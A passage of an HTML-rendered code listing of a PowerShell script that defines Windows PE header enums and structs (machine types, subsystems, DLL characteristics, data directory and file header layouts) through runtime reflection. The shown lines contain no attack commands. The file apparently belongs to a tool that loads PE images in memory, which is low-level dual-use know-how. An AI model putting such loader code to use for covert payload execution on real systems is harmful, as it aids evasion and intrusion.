          <td id="LC272" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Native<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L273" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="273"></td>
          <td id="LC273" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>I386<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x014c</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L274" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="274"></td>
          <td id="LC274" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Itanium<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0200</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L275" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="275"></td>
          <td id="LC275" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>x64<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x8664</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L276" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="276"></td>
          <td id="LC276" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$MachineType</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L277" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="277"></td>
          <td id="LC277" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name MachineType <span class="pl-k">-</span>Value <span class="pl-smi">$MachineType</span></td>
        </tr>
        <tr>
          <td id="L278" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="278"></td>
          <td id="LC278" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L279" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="279"></td>
          <td id="LC279" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Enum MagicType</span></td>
        </tr>
        <tr>
          <td id="L280" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="280"></td>
          <td id="LC280" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineEnum</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MagicType<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>])</td>
        </tr>
        <tr>
          <td id="L281" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="281"></td>
          <td id="LC281" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_NT_OPTIONAL_HDR32_MAGIC<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x10b</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L282" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="282"></td>
          <td id="LC282" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_NT_OPTIONAL_HDR64_MAGIC<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x20b</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L283" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="283"></td>
          <td id="LC283" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$MagicType</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L284" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="284"></td>
          <td id="LC284" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name MagicType <span class="pl-k">-</span>Value <span class="pl-smi">$MagicType</span></td>
        </tr>
        <tr>
          <td id="L285" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="285"></td>
          <td id="LC285" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L286" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="286"></td>
          <td id="LC286" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Enum SubSystemType</span></td>
        </tr>
        <tr>
          <td id="L287" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="287"></td>
          <td id="LC287" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineEnum</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SubSystemType<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>])</td>
        </tr>
        <tr>
          <td id="L288" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="288"></td>
          <td id="LC288" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_UNKNOWN<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L289" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="289"></td>
          <td id="LC289" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_NATIVE<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">1</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L290" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="290"></td>
          <td id="LC290" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_WINDOWS_GUI<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">2</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L291" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="291"></td>
          <td id="LC291" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_WINDOWS_CUI<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">3</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L292" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="292"></td>
          <td id="LC292" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_POSIX_CUI<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">7</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L293" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="293"></td>
          <td id="LC293" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_WINDOWS_CE_GUI<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">9</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L294" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="294"></td>
          <td id="LC294" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_EFI_APPLICATION<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">10</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L295" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="295"></td>
          <td id="LC295" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">11</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L296" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="296"></td>
          <td id="LC296" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">12</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L297" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="297"></td>
          <td id="LC297" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_EFI_ROM<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">13</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L298" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="298"></td>
          <td id="LC298" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_SUBSYSTEM_XBOX<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">14</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L299" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="299"></td>
          <td id="LC299" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SubSystemType</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L300" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="300"></td>
          <td id="LC300" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name SubSystemType <span class="pl-k">-</span>Value <span class="pl-smi">$SubSystemType</span></td>
        </tr>
        <tr>
          <td id="L301" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="301"></td>
          <td id="LC301" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L302" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="302"></td>
          <td id="LC302" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Enum DllCharacteristicsType</span></td>
        </tr>
        <tr>
          <td id="L303" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="303"></td>
          <td id="LC303" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineEnum</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>DllCharacteristicsType<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>])</td>
        </tr>
        <tr>
          <td id="L304" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="304"></td>
          <td id="LC304" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>RES_0<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0001</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L305" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="305"></td>
          <td id="LC305" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>RES_1<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0002</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L306" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="306"></td>
          <td id="LC306" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>RES_2<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0004</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L307" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="307"></td>
          <td id="LC307" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>RES_3<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0008</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L308" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="308"></td>
          <td id="LC308" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0040</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L309" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="309"></td>
          <td id="LC309" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0080</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L310" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="310"></td>
          <td id="LC310" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLL_CHARACTERISTICS_NX_COMPAT<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0100</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L311" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="311"></td>
          <td id="LC311" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLLCHARACTERISTICS_NO_ISOLATION<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0200</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L312" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="312"></td>
          <td id="LC312" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLLCHARACTERISTICS_NO_SEH<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0400</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L313" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="313"></td>
          <td id="LC313" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLLCHARACTERISTICS_NO_BIND<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x0800</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L314" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="314"></td>
          <td id="LC314" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>RES_4<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x1000</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L315" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="315"></td>
          <td id="LC315" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLLCHARACTERISTICS_WDM_DRIVER<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x2000</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L316" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="316"></td>
          <td id="LC316" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineLiteral</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>] <span class="pl-c1">0x8000</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L317" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="317"></td>
          <td id="LC317" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllCharacteristicsType</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L318" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="318"></td>
          <td id="LC318" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name DllCharacteristicsType <span class="pl-k">-</span>Value <span class="pl-smi">$DllCharacteristicsType</span></td>
        </tr>
        <tr>
          <td id="L319" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="319"></td>
          <td id="LC319" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L320" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="320"></td>
          <td id="LC320" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>##########    STRUCT    ###########</span></td>
        </tr>
        <tr>
          <td id="L321" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="321"></td>
          <td id="LC321" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_DATA_DIRECTORY</span></td>
        </tr>
        <tr>
          <td id="L322" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="322"></td>
          <td id="LC322" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L323" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="323"></td>
          <td id="LC323" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DATA_DIRECTORY<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L324" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="324"></td>
          <td id="LC324" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>VirtualAddress<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">0</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L325" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="325"></td>
          <td id="LC325" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Size<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">4</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L326" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="326"></td>
          <td id="LC326" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_DATA_DIRECTORY</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L327" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="327"></td>
          <td id="LC327" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_DATA_DIRECTORY <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span></td>
        </tr>
        <tr>
          <td id="L328" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="328"></td>
          <td id="LC328" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L329" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="329"></td>
          <td id="LC329" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_FILE_HEADER</span></td>
        </tr>
        <tr>
          <td id="L330" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="330"></td>
          <td id="LC330" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L331" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="331"></td>
          <td id="LC331" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_FILE_HEADER<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">20</span>)</td>
        </tr>
        <tr>
          <td id="L332" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="332"></td>
          <td id="LC332" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Machine<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L333" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="333"></td>
          <td id="LC333" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfSections<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L334" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="334"></td>
